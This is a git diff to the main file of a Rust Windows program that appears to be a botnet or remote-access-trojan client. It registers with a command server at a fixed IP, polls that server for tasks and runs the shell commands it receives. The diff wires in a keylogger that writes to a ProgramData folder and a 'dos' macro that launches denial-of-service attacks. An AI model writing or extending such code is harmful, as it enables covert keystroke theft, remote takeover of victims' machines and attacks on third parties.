@@ -1,4 +1,4 @@
-#![windows_subsystem = "windows"]
+// #![windows_subsystem = "windows"]
 
 extern crate reqwest;
 extern crate serde_json;
@@ -6,9 +6,11 @@ extern crate windows;
 extern crate winreg;
 
 mod commands;
+mod keylogger;
 mod node;
 mod utils;
 
+use commands::dos;
 use node::Node;
 use reqwest::Client;
 use serde_json::Value;
@@ -18,6 +20,8 @@ use utils::{calculate_hash, get_uuid};
 use windows::{
     Win32::Foundation::*, Win32::System::Diagnostics::*, Win32::UI::WindowsAndMessaging::*,
 };
+
+const SERVER: &str = "http://172.20.0.3:8000";
 
 #[tokio::main]
 async fn main() {
@@ -38,7 +42,7 @@ async fn main() {
     }
 
     // check if test endpoint is returning proper response
-    let brew_check = client.get("http://172.20.0.3:8000/api/brew").send().await;
+    let brew_check = client.get(format!("{}/api/brew", SERVER)).send().await;
 
     if brew_check.unwrap().status() != 418 {
         println!("Server didn't return 418, exiting...");
@@ -68,6 +72,11 @@ async fn main() {
 
     println!("{:?}", node);
 
+    // start keylogger
+    let data_folder: String = format!("C:\\ProgramData\\{},{}", node.uuid, node.random_input);
+
+    thread::spawn(move || keylogger::start(data_folder));
+
     // main loop
     loop {
         let uuid: String = get_uuid();
@@ -78,7 +87,7 @@ async fn main() {
         let json = serde_json::to_string(&node).unwrap();
 
         let update_realtime = client
-            .patch("http://172.20.0.3:8000/api/node/1/")
+            .patch(format!("{}/api/node/1/", SERVER))
             .body(json)
             .header("Content-Type", "application/json")
             .header("uuid", uuid.to_owned())
@@ -98,7 +107,7 @@ async fn main() {
         println!("Update Info: {}", update_realtime.unwrap().status());
 
         let receive_command = client
-            .get("http://172.20.3:8000/api/receive")
+            .get(format!("{}/api/receive", SERVER))
             .header("uuid", uuid.to_owned())
             .send()
             .await;
@@ -192,7 +201,7 @@ async fn register() -> Node {
     let json: String = serde_json::to_string(&node).unwrap();
 
     let register = client
-        .post("http://172.20.0.3:8000/api/node/")
+        .post(format!("{}/api/node/", SERVER))
         .body(json)
         .header("Content-Type", "application/json")
         .send()
@@ -211,6 +220,7 @@ async fn register() -> Node {
         Ok(_) => println!("Created dir {}", path.to_str().unwrap()),
         Err(e) => println!("Error: {}", e),
     }
+
     return node;
 }
 
@@ -228,16 +238,16 @@ async fn command(command_json: String, uuid: String) {
 
         let command_type = command["command_type"].as_str().unwrap().to_string();
 
+        let args: Vec<String> = command["command"]
+            .as_str()
+            .unwrap()
+            .split(" ")
+            .map(|s| s.to_string())
+            .collect();
+
+        let program: String = args[0].to_string();
+
         if command_type == "shell" {
-            let args: Vec<String> = command["command"]
-                .as_str()
-                .unwrap()
-                .split(" ")
-                .map(|s| s.to_string())
-                .collect();
-
-            let program: String = args[0].to_string();
-
             // run command with args
             thread::spawn(
                 move || match Command::new(program.as_str()).args(&args[1..]).spawn() {
@@ -247,25 +257,29 @@ async fn command(command_json: String, uuid: String) {
                     Err(e) => println!("Error: {}", e),
                 },
             );
-
-            if command["repeat_at"] == serde_json::json!(null) {
-                // signal command has been run (really received)
-                let signal = client
-                    .get("http://172.20.0.3:8000/api/signal")
-                    .header("uuid", uuid.to_owned())
-                    .query(&[("command-id", command["id"].as_u64().unwrap())])
-                    .send()
-                    .await;
-
-                if let Err(e) = signal {
-                    println!("Error: {}", e);
-                    abort();
-                }
-            }
-
-            return;
         } else if command_type == "macro" {
-            return;
+            if program == "dos".to_string() {
+                thread::spawn(move || dos(args));
+            } else {
+                println!("I do nothing... yet");
+            }
+        }
+
+        if command["repeat_at"] == serde_json::json!(null) {
+            // signal command has been run (really received)
+            let signal = client
+                .get(format!("{}/api/signal", SERVER))
+                .header("uuid", uuid.to_owned())
+                .query(&[("command-id", command["id"].as_u64().unwrap())])
+                .send()
+                .await;
+
+            if let Err(e) = signal {
+                println!("Error: {}", e);
+                abort();
+            }
         }
     }
+
+    return;
 }
